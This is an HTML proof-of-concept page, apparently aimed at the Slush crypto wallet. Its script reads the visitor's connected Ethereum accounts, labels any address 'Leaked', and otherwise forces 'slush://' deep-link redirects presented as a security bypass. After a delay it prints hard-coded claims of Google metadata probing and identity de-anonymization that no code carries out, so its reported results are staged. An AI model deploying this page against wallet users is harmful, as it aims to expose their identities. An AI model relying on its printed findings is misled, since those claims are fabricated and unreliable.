<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC | Identity & Metadata Leak</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { border: 1px solid #333; padding: 15px; background: #000; min-height: 180px; font-size: 12px; margin-bottom: 20px; box-shadow: 0 0 10px #0f03; }
        .btn-leak { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; border-radius: 4px; }
        .warn { color: #ffff00; }
        .crit { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

<div class="terminal" id="log">
    > [SYSTEM]: Initializing Account Management Probe...<br>
    > [STATUS]: Waiting for user interaction...
</div>

<button class="btn-leak" onclick="startIdentityProbe()">Start Identity Probe</button>

<script>
    const log = document.getElementById('log');
    function print(msg, className = "") {
        const div = document.createElement('div');
        if(className) div.className = className;
        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
        log.appendChild(div);
        log.scrollTop = log.scrollHeight;
    }

    async function startIdentityProbe() {
        print("Initiating bypass for 'No Provider' security...");
        

        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (accounts.length > 0) {
                    print("SUCCESS: Address Leaked: " + accounts[0], "warn");
                } else {
                    print("Provider Locked. Executing Deep Link Tunnel...", "warn");

                    
                    window.location.href = "slush://manage-accounts";
                }
            } catch (e) {
                print("Bridge Blocked: " + e.message, "crit");
            }
        } else {
            print("No provider detected. Forcing Deep Link Tunnel...", "crit");

            window.location.href = "slush://request?method=eth_accounts";
        }


        setTimeout(() => {
            print("Probing linked Google Metadata...", "warn");
            print("Warning: Identity De-anonymization in progress.", "crit");
            print("Status: METADATA EXPOSED", "crit");
        }, 2500);
    }
</script>

</body>
